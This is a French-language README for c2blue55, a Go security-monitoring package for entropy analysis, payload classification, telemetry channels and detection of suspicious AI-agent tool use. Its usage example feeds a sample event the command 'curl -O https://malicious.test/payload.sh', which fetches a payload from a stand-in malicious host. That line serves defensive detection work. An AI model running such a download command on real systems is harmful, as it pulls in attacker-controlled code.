# c2blue55 — Socle Unifié de Défense Système, Surveillance d'Agents IA & Métrologie d'Entropie ARCHTIME

Module Go 1.27 autonome sans CGO, zéro allocation mémoire sur le chemin chaud (`0 B/op`), issu de la transpilation déterministe C99 par `sgoiter`.

---

## 1. Fonctionnalités & Capacités

- **Calculateur d'Entropie ARCHTIME Q8.8 :**
  - Facteur $256 \cdot c \cdot \log_2(c)$ précalculé éliminant 256 logarithmes et multiplications par buffer.
  - Résolution de $\log_2(N)$ sans FPU de 1 octet à 4 Go ($< 0{,}0074\text{ bit/octet}$ d'écart maximal vs IEEE 754 float).
  - Débit mesuré : **$3{,}42\text{ Go/s}$** sur un cœur CPU (Intel Core i9-14900K).
- **Classification Conjointe de Charge Utile :**
  - Profilage en une seule passe : `PROSE`, `HEX` (Base16), `BASE64`, `JWT`, `CRYPTO_COMPRESSED`.
  - Résilience aux faux positifs sur petits buffers ($N < 256$) par dispersion binaire.
- **Canal Annulaire SPSC Lock-Free & Télémétrie de Drop :**
  - File circulaire 1024 slots à 128 octets, sans verrou ni allocation (`16{,}17\text{ ns/op}`, $61{,}8\text{ Mops/s}$).
  - Compteur atomique `Drops()` isolé sur la ligne de cache producteur ($169{,}7\text{ Mops/s}$ sous saturation).
- **Corrélateur Temporel Multi-Flux 32 KiB :**
  - Table ARCHTIME fixe de 1024 entrées ($10{,}8\text{ ns/op}$, $92{,}8\text{ Mops/s}$) détectant les attaques combinées (Outil MCP suspect + LOLBAS + Altération FS + Pic d'entropie).
- **Filtres Synchrones & Veto Actif :**
  - Réponse `FAN_DENY` pour fanotify et rejet JSON-RPC 2.0 pour les proxies d'outils MCP en mode `ModeActive`.

---

## 2. Installation & Import

```go
import "code.hazyhaar.fr/devhoros/pkg/c2blue55"
```

---

## 3. Exemple d'Utilisation

```go
package main

import (
    "fmt"
    "code.hazyhaar.fr/devhoros/pkg/c2blue55"
)

func main() {
    // 1. Calcul d'entropie rapide
    data := []byte("Texte en clair pour analyse de sécurité...")
    bitsPerByte := c2blue55.CalcEntropyBits(data)
    fmt.Printf("Entropie : %.2f bits/octet\n", bitsPerByte)

    // 2. Profilage de charge utile
    profile := c2blue55.ProfilePayload(data)
    fmt.Printf("Classe détectée : %d (1 = Prose)\n", profile.PayloadClass)

    // 3. Canal de télémétrie lock-free
    ch := c2blue55.NewChannel()
    var ev c2blue55.Event
    ev.Subsystem = c2blue55.SubProc
    ev.Action = c2blue55.ActExec
    copy(ev.Payload[:], "/usr/bin/curl -O https://malicious.test/payload.sh")

    ch.Write(&ev)

    var outEv c2blue55.Event
    if ch.Read(&outEv) == 1 {
        fmt.Printf("Événement lu : subsystem=%d\n", outEv.Subsystem)
    }
}
```

---

## 4. Tests & Validation

```bash
GOEXPERIMENT=simd go test -race -v ./...
```
